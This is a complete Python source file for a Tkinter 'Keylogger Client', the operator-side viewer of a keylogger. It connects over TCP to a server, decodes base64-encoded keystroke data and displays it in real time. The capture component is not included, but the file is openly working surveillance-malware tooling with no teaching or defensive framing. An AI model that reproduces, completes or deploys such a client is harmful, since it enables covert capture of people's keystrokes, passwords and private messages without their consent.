# KeyloggerClient.py
import tkinter as tk
from tkinter import scrolledtext, Tk, Label, Button, messagebox
import socket
import base64
from threading import Thread

class KeyloggerClient:
    def __init__(self, root, host="127.0.0.1", port=65432):
        self.root = root
        self.root.title("Keylogger Client")
        self.root.geometry("900x600")
        self.root.configure(bg="#0D1117")  # Dark background

        # DPI Awareness (Windows only)
        try:
            from ctypes import windll
            windll.shcore.SetProcessDpiAwareness(1)
        except:
            pass

        # Title and subtitle labels
        self.title_label = Label(root, text="Keylogger Client", font=("Bahnschrift", 28, "bold"),
                                 fg="#C9D1D9", bg="#0D1117")
        self.title_label.pack(pady=10)
        self.subtitle_label = Label(root, text="Receiving keystrokes in real-time", font=("Arial", 16),
                                    fg="#8B949E", bg="#0D1117")
        self.subtitle_label.pack(pady=5)

        # Retry connection button
        self.connect_button = Button(root, text="Retry Connection", command=self.retry_connection,
                                     font=("Bahnschrift", 14), bg="#C9D1D9", fg="#0D1117")
        self.connect_button.pack(pady=10)

        # Log display
        self.main_frame = tk.Frame(root, bg="#0D1117")
        self.main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)
        self.log_display = scrolledtext.ScrolledText(self.main_frame, wrap=tk.WORD, font=("Consolas", 14),
                                                     bg="#0D1117", fg="#C9D1D9", insertbackground='#58A6FF',
                                                     borderwidth=0, relief='flat')
        self.log_display.pack(padx=15, pady=15, fill=tk.BOTH, expand=True)

        # Connection settings
        self.server_host = host
        self.server_port = port
        self.client_socket = None

        # Attempt initial connection
        Thread(target=self.startTcpConnection, daemon=True).start()

    def startTcpConnection(self):
        """Initialize TCP client connection to receive logs."""
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.client_socket.connect((self.server_host, self.server_port))
            messagebox.showinfo("Connection Status", "Connected to the server!")
            self.receiveLogs()
        except Exception as e:
            messagebox.showerror("Connection Status", f"Failed to connect: {e}")

    def receiveLogs(self):
        """Continuously receive and display logs from server."""
        while True:
            try:
                data = self.client_socket.recv(1024).decode()
                if data:
                    decoded_data = base64.b64decode(data.strip()).decode()
                    self.updateLogDisplay(decoded_data)
            except (ConnectionResetError, ConnectionAbortedError):
                print("Server disconnected.")
                break

    def updateLogDisplay(self, log_entry):
        """Display new log entry in the log display area."""
        self.log_display.insert(tk.END, log_entry)
        self.log_display.see(tk.END)

    def retry_connection(self):
        """Retry connection to the server if disconnected."""
        if self.client_socket:
            self.client_socket.close()
        Thread(target=self.startTcpConnection, daemon=True).start()

    def onClose(self):
        """Close TCP connection and GUI."""
        if self.client_socket:
            self.client_socket.close()
        self.root.destroy()

# GUI initialization
root = Tk()
app = KeyloggerClient(root)
root.protocol("WM_DELETE_WINDOW", app.onClose)
root.mainloop()
